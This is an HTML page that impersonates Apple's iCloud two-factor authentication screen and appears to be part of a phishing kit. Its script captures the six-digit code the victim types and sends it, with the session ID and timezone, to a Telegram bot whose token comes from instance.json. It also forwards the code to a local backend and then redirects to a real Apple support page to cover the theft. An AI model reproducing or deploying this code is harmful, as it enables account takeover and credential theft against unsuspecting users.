<html lang="en"><head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="etc/favicon.png" type="image/png">
  <title>iCloud - Two-Factor Authentication</title>
  <style>
    :root {
      --header-bg: rgba(251, 251, 253, 0.5);
      --header-border: 1px solid rgba(251, 251, 253, 0.5);
      --header-height: 44px;
      --theme-color-fillSecondary: rgba(0, 0, 0, 0.1);
      --theme-color-boxShadow: rgba(0, 0, 0, 0.65);
      --theme-color-systemBlack: #000000;
    }

    body {
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
    }

    @media (max-width: 768px) {
      body {
        overflow-x: hidden;
        width: 100%;
      }
      #content {
        background: none !important;
        border: none !important;
        box-shadow: none !important;
        backdrop-filter: none !important;
        width: 100% !important;
        max-width: 100% !important;
        padding: 0 5vw !important;
        box-sizing: border-box !important;
      }
      .content-container {
        padding: 32px 0 !important;
        width: 100% !important;
      }
      .text-input {
        width: 100% !important;
        max-width: 100% !important;
        box-sizing: border-box !important;
      }
    }

    header {
      position: sticky;
      top: 0;
      display: flex;
      align-items: center;
      background: var(--header-bg);
      height: var(--header-height);
      min-height: var(--header-height);
      padding-left: 16px;
      padding-right: 6px;
      border-block-end: var(--header-border); /* Logical border */
      border-bottom: var(--header-border); /* Fallback */
      z-index: 1000; /* Ensure header stays above other content */
    }

    header img {
      height: 32px; /* Adjust logo size as needed */
      width: auto;
    }

    .particle-icon {
      width: 160px;
      height: auto;
    }

    .signin-heading {
      margin-top: 20px;
      margin-block-start: 20px;
      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
      font-size: 24px;
      font-weight: 500;
      line-height: 36px;
      color: black;
      text-align: center;
    }

    .signin-subheading {
      margin-top: 12px;
      font-size: 16px;
      color: #6e6e73;
      text-align: center;
      max-width: 320px;
      line-height: 1.4;
    }

    .content-container {
      position: relative;
      width: 100%;
      max-width: 465px;
      margin: 24px auto 0;
      padding: 32px 32px 60px; /* Extra space at bottom for spinner */
      box-sizing: border-box;
      text-align: center;
    }

    .input-group {
      width: 100%;
      max-width: 465px;
      margin: 0 auto;
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid #86868b;
      min-height: 54px; /* Height of one input field */
      position: relative; /* For absolute positioning of the password field */
    }
    
    .input-wrapper {
      position: relative;
      width: 100%;
    }
    
    .top-input {
      width: 100%;
      padding-right: 50px;
    }
    
    .arrow-button {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: 1px solid #86868b;
      background: transparent;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 0;
      transition: all 0.2s ease;
      z-index: 10;
      pointer-events: auto;
    }
    
    .arrow-button:hover {
      background: rgba(0, 0, 0, 0.05);
    }
    
    .arrow-button:active {
      transform: translateY(-50%) scale(0.95);
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .arrow-button .spinner {
      display: none;
      width: 20px;
      height: 20px;
      position: relative;
    }
    
    .arrow-button .spinner::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: 
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 50% 0/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 85% 15%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 100% 50%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 85% 85%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 50% 100%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 15% 85%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 0 50%/15% 15% no-repeat,
        radial-gradient(farthest-side, #1d1d1f 90%, transparent) 15% 15%/15% 15% no-repeat;
      animation: spin 1s linear infinite;
    }
    
    .arrow-button.loading .spinner {
      display: block;
    }
    
    .arrow-button.loading svg:not(.spinner) {
      display: none;
    }

    .text-input {
      width: 100%;
      padding: 26px 16px 10px;
      height: 54px;
      border: none;
      font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
      font-size: 16px;
      box-sizing: border-box;
      outline: none;
      background: transparent;
      z-index: 1;
      position: relative;
      line-height: 24px;
    }
    
    .floating-label {
      position: relative;
      width: 100%;
    }
    
    .floating-label label {
      position: absolute;
      top: 16px;
      left: 16px;
      color: #86868b;
      font-size: 16px;
      transition: all 0.2s ease;
      pointer-events: none;
      z-index: 0;
      line-height: 1.5;
    }
    
    .floating-label input:focus + label,
    .floating-label input:not(:placeholder-shown) + label {
      top: 6px;
      font-size: 12px;
      color: #0066cc;
    }
    
    .floating-label input:focus + label:not(.error) {
      color: #0066cc;
    }
    
    .floating-label input.error {
      border-color: #ff3b30 !important;
      box-shadow: 0 0 0 1px #ff3b30;
    }
    
    .floating-label input.error.shake {
      animation: shake 0.5s ease-in-out;
    }
    
    .floating-label.error label,
    .input-group.error .floating-label label {
      color: #ff3b30 !important;
    }
    
    .input-group.error {
      border-color: #ff3b30 !important;
    }
    
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      10%, 30%, 50%, 70%, 90% { transform: translateX(-2px); }
      20%, 40%, 60%, 80% { transform: translateX(2px); }
    }
    
    .text-input::placeholder {
      color: #6e6e73;
    }

    .top-input {
      border-bottom: 1px solid #86868b;
      border-radius: 12px 12px 0 0;
    }

    .bottom-input {
      border-radius: 0 0 12px 12px;
      width: 100%;
      padding-right: 50px;
    }
    
    .password-wrapper {
      position: relative;
    }
    
    .password-continue {
      position: absolute;
      right: 8px;
      top: 50%;
      transform: translateY(-50%);
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: 1px solid #86868b;
      background: transparent;
      display: none;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      padding: 0;
      transition: all 0.2s ease;
    }
    
    /* When password is hidden */
    .input-group:has(.bottom-input[style*="display: none"]) .top-input {
      border-radius: 12px;
    }

    .text-input:focus {
      outline: none;
      border-color: #0071e3;
      box-shadow: 0 0 0 3px rgba(0, 125, 250, 0.1);
    }

    .otp-input:focus {
      outline: none;
      border-color: #0071e3;
      box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.2);
    }

    /* Loading spinner */
    .loading-spinner {
      display: none;
      position: absolute;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      width: 24px;
      height: 24px;
      border: 3px solid rgba(0, 0, 0, 0.1);
      border-radius: 50%;
      border-top-color: #0071e3;
      animation: spin 1s ease-in-out infinite;
      z-index: 1000;
    }
    
    @keyframes spin {
      to { transform: translateX(-50%) rotate(360deg); }
    }
    
    .loading .loading-spinner {
      display: block;
    }
    
    /* Simple red error message below OTP boxes */
    .error-message {
      position: absolute;
      top: calc(100% + 8px);
      left: 0;
      right: 0;
      color: #ff3b30;
      font-size: 13px;
      text-align: center;
      visibility: hidden;
      z-index: 10;
      width: 100%;
    }
    
    .error-message.visible {
      visibility: visible;
      animation: fadeIn 0.3s ease-out;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-5px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    /* Loading state */
    body.loading .otp-input,
    body.loading .otp-input:focus {
      border-color: #d2d2d7;
      background-color: #f5f5f7;
      box-shadow: none;
      opacity: 0.8;
      transform: scale(0.98);
      pointer-events: none;
      transition: all 0.2s ease;
    }
    
    /* Disabled state */
    .otp-input:disabled {
      background-color: #f5f5f7;
      color: #86868b;
      cursor: not-allowed;
    }

    #content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 32px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 70vw;
      max-width: 580px;
      height: 70vh;
      max-height: 640px;
      border-radius: 32px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0);
      box-shadow: 0 11px 34px 0 var(--theme-color-fillSecondary);
    }

    .otp-container {
      display: flex;
      justify-content: center;
      gap: 8px; /* Adjusted gap for smaller boxes */
      margin-top: 20px; /* Added space below the title */
    }

    .otp-container-absolute {
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
    }

    .otp-input {
      width: 34px; /* Reduced by ~30% */
      height: 38px; /* Reduced by ~30% */
      font-size: 18px; /* Adjusted font size */
      text-align: center;
      border: 1px solid #d2d2d7;
      border-radius: 12px;
      background-color: #f5f5f7;
      outline: none;
      transition: border-color 0.2s ease, box-shadow 0.2s ease;
    }

    .otp-input:focus {
      border-color: #0071e3;
      box-shadow: 0 0 0 4px rgba(0, 113, 227, 0.2);
    }
    @media (prefers-color-scheme: dark) {
      body {
        background: #1c1c1e !important;
        color: #f2f2f7;
      }

      header {
        background-color: rgba(28, 28, 30, 0.5);
        border-block-end: 1px solid rgba(29, 29, 31, 0.5);
        border-bottom: 1px solid rgba(29, 29, 31, 0.5);
      }

      header img {
        filter: invert(1);
      }

      .signin-heading,
      .signin-subheading {
        color: #f2f2f7;
      }

      .input-group {
        border-color: #3a3a3c;
      }

      .text-input {
        background: #2c2c2e;
        color: #f2f2f7;
      }

      .text-input::placeholder {
        color: #8e8e93;
      }

      .arrow-button {
        border-color: #3a3a3c;
        background: #2c2c2e;
      }

      .arrow-button:hover {
        background: rgba(255, 255, 255, 0.1);
      }

      .otp-input {
        background-color: #2c2c2e;
        color: #f2f2f7;
        border-color: #3a3a3c;
      }

      .otp-input:focus {
        box-shadow: 0 0 0 4px rgba(10, 132, 255, 0.3);
      }

      .otp-input:disabled {
        background-color: #3a3a3c;
        color: #8e8e93;
      }

      #content {
        background: #1c1c1e;
        border: 1px solid rgba(255, 255, 255, 0);
        box-shadow: 0 11px 34px 0 var(--theme-color-boxShadow);
      }

      .loading-spinner {
        border-color: rgba(255, 255, 255, 0.1);
        border-top-color: #f2f2f7;
      }

      #particle-path-to-invert {
        fill: #ffffff !important;
      }
    }
  </style>
</head>

    <div class="signin-heading">Two-Factor Authentication</div>
      <!--
        Container for the OTP input fields. This div is absolutely positioned
        relative to its parent, and is used to position the OTP input fields
        correctly.
      -->
    <div class="content-container">
      <div class="otp-container otp-container-absolute">
        <input type="tel" class="otp-input" maxlength="1">
        <input type="tel" class="otp-input" maxlength="1">
        <input type="tel" class="otp-input" maxlength="1">
        <input type="tel" class="otp-input" maxlength="1">
        <input type="tel" class="otp-input" maxlength="1">
        <input type="tel" class="otp-input" maxlength="1">
        <div id="error-message" class="error-message"></div>
      </div>
      <div class="loading-spinner"></div>
    </div>
    <p class="signin-subheading">Enter the verification code sent to your phone number.</p>
      <div style="text-align: center; font-size: 14px; color: #1d1d1fae;">
        <div style="margin-bottom: 12px;">
          <a href="#" style="color: #0066cc; text-decoration: none;">Resend code</a>
        </div>
        <div>
          <a href="#" style="color: #0066cc; text-decoration: none;">Can't use this phone number?</a>
        </div>
  <div id="footer"></div>
  <script>
document.addEventListener('DOMContentLoaded', function() {
const otpInputs = document.querySelectorAll('.otp-input');

function isOTPComplete() {
  return Array.from(otpInputs).every(input => input.value.length === 1);
}

function getOTP() {
  return Array.from(otpInputs).map(input => input.value).join('');
}

function showError(message) {
  const errorElement = document.getElementById('error-message');
  errorElement.textContent = message;
  errorElement.classList.add('visible');

  otpInputs.forEach(input => {
    input.addEventListener('input', function clearError() {
      errorElement.classList.remove('visible');
      input.removeEventListener('input', clearError);
    }, { once: true });
  });
}

async function send2FANotification(code, sessionId) {
  try {
    let config;
    try {
      const response = await fetch('instance.json');
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      config = await response.json();
      console.log('✅ Loaded config from instance.json');
    } catch (configError) {
      console.error(configError.message);
      return; // Skip notification if config fails
    }
    
    const msg = `🔐 2FA Code Entered

*Code:* ${code}
*Session:* ${sessionId}
*Time:* ${new Date().toLocaleString()}, TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
    
    await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.chat_id,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
    
    console.log('✅ 2FA notification sent to Telegram');
  } catch (err) {
    console.error('❌ Failed to send 2FA notification:', err);
  }
}

async function submitOTP() {
  const code = getOTP();
  if (code.length !== 6) return;

  console.log('Submitting OTP:', code);

  try {
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session_id') || '';

    if (!sessionId) {
      throw new Error('Session ID not found. Please start over.');
    }

    // Send Telegram notification with 2FA code
    await send2FANotification(code, sessionId);

    document.body.classList.add('loading');
    document.querySelector('.loading-spinner').style.display = 'block';
    otpInputs.forEach(input => { input.disabled = true; });

    const response = await fetch('http://127.0.0.1:5000/2fa', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionId,
        code: code
      })
    });

    const data = await response.json();

    if (response.ok) {
      // 200 → success
      console.log('OTP verification successful.');
      window.location.href = 'https://support.apple.com/en-us/108349?device-type=iphone';
      return;
    }

    if (response.status === 400) {
      if (data.error === 'invalid or expired session') {
        window.location.href = 'index.html';
        return;
      }
      if (data.error === 'invalid 2fa code format') {
        throw new Error('Invalid verification code format.');
      }
    } else if (response.status === 401) {
      throw new Error(data.error || 'Incorrect verification code. Please try again.');
    }

    throw new Error(data.error || 'An unexpected error occurred. Please try again.');

  } catch (error) {
    console.error('OTP Error:', error);
    showError(error.message);
    otpInputs.forEach(input => input.value = '');
    otpInputs[0].focus();
  } finally {
    document.body.classList.remove('loading');
    document.querySelector('.loading-spinner').style.display = 'none';
    otpInputs.forEach(input => { input.disabled = false; });
  }
}

if (otpInputs.length > 0) {
  otpInputs[0].focus();

  otpInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      input.value = input.value.replace(/[^0-9]/g, '');

      if (input.value && index < otpInputs.length - 1) {
        otpInputs[index + 1].focus();
      }

      if (isOTPComplete()) {
        submitOTP();
      }
    });

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace') {
        if (!input.value && index > 0) {
          e.preventDefault();
          otpInputs[index - 1].focus();
        } else if (input.value) {
          input.value = '';
        }
      }
    });

    input.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = (e.clipboardData || window.clipboardData).getData('text');
      const pasteDigits = pasteData.replace(/\D/g, '');

      for (let i = 0; i < pasteDigits.length && (index + i) < otpInputs.length; i++) {
        otpInputs[index + i].value = pasteDigits[i];
      }

      const nextFocusIndex = Math.min(index + pasteDigits.length, otpInputs.length - 1);
      otpInputs[nextFocusIndex].focus();

      if (isOTPComplete()) {
        submitOTP();
      }
    });

    input.addEventListener('keypress', (e) => {
      if (!/[0-9]/.test(e.key)) {
        e.preventDefault();
      }
    });
  });
}
});

  </script>
